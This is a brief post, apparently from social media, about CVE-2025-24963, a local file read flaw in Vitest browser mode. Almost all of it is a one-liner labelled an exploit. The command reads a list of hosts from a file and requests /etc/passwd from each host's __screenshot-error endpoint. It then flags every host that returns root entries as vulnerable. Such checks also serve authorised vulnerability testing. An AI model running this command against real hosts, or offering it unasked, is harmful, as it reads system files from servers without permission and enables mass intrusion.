🚨 CVE-2025-24963 - Vitest Browser Mode Local File Read 🚨

💥One Liner Exploit: 
cat file.txt | while read host; do curl -skL "http://$host/__screenshot-error?file=/etc/passwd" | grep -E "root:.*:/bin/" && echo "$host is VULN"; done

---
